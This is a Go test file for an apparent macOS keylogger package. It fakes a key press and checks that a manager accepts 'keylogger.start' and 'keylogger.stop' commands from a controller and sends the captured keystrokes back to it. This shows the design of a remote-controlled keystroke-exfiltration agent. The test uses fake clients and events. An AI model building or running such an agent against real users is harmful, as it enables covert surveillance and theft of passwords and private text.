//go:build darwin && cgo

package keylogger

import (
	"context"
	"encoding/json"
	"testing"
	"time"
)

func TestManagerDarwinProviderIntegration(t *testing.T) {
	originalStarter := darwinStartCapture
	defer func() { darwinStartCapture = originalStarter }()

	darwinStartCapture = func(ctx context.Context, stream *channelEventStream) error {
		go func() {
			time.Sleep(10 * time.Millisecond)
			event := CaptureEvent{
				Timestamp: time.Now(),
				Key:       "a",
				Text:      "a",
				Pressed:   true,
			}
			stream.emit(ctx, event)
			<-ctx.Done()
			stream.Close()
		}()
		return nil
	}

	provider := defaultProviderFactory()()
	if _, ok := provider.(*darwinProvider); !ok {
		t.Fatalf("expected darwin provider, got %T", provider)
	}

	client := &fakeHTTPClient{}
	manager := NewManager(Config{AgentID: "agent-darwin", BaseURL: "https://controller", Client: client})

	payload := CommandPayload{
		Action: "start",
		Config: &StartConfig{Mode: ModeStandard, CadenceMs: 25, BufferSize: 2},
	}
	data, _ := json.Marshal(payload)
	result := manager.HandleCommand(context.Background(), Command{ID: "cmd-darwin", Name: "keylogger.start", Payload: data})
	if !result.Success {
		t.Fatalf("start failed: %s", result.Error)
	}

	req := client.popRequest(t)
	var envelope EventEnvelope
	if err := json.Unmarshal(req.Body, &envelope); err != nil {
		t.Fatalf("failed to decode envelope: %v", err)
	}
	if len(envelope.Events) == 0 {
		t.Fatalf("expected events from darwin provider")
	}
	if envelope.Events[0].Key != "a" {
		t.Fatalf("expected key 'a', got %s", envelope.Events[0].Key)
	}

	stopPayload := CommandPayload{Action: "stop", SessionID: envelope.SessionID}
	stopData, _ := json.Marshal(stopPayload)
	stopResult := manager.HandleCommand(context.Background(), Command{ID: "cmd-stop", Name: "keylogger.stop", Payload: stopData})
	if !stopResult.Success {
		t.Fatalf("stop failed: %s", stopResult.Error)
	}
}
